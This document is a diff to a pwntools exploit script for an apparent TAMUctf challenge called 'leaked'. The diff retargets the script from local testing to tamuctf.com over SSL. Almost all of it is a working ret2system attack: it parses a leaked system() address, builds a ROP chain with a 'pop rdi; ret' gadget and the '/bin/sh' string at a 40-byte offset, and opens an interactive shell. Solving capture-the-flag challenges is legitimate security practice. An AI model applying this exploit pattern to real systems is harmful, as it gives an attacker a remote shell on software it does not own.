@@ -8,34 +8,22 @@ rop = ROP(exe)
 
 context.binary = exe
 context.terminal = "kitty"
-def conn():
-    if args.REMOTE:
-        return remote("localhost", 7001)
-    elif args.GDB:
-        return gdb.debug(exe.path)
-    else:
-        return process(exe.path)
 
+CHAL = "leaked"
 
-def main():
-    r = conn()
-    system_addr = int(re.search("(0x[0-9a-fA-F]+)", r.recvline().decode()).group(1), 16)
-    log.info(f"system addr: {hex(system_addr)}")
-    payload = flat({
-        40: [
-            p64((rop.find_gadget(['pop rdi', 'ret']))[0]),
-            p64(next(exe.search(b'/bin/sh'))),
-            p64(system_addr),
-        ]
+p = remote("tamuctf.com", 443, ssl=True, sni=CHAL)
 
-    })
-    r.sendline(payload)
-    r.sendline(b"")
+system_addr = int(re.search("(0x[0-9a-fA-F]+)", p.recvline().decode()).group(1), 16)
+log.info(f"system addr: {hex(system_addr)}")
+payload = flat({
+    40: [
+        p64((rop.find_gadget(['pop rdi', 'ret']))[0]),
+        p64(next(exe.search(b'/bin/sh'))),
+        p64(system_addr),
+    ]
 
-    # good luck pwning :)
+})
+p.sendline(payload)
+p.sendline(b"")
 
-    r.interactive()
-
-
-if __name__ == "__main__":
-    main()
+p.interactive()
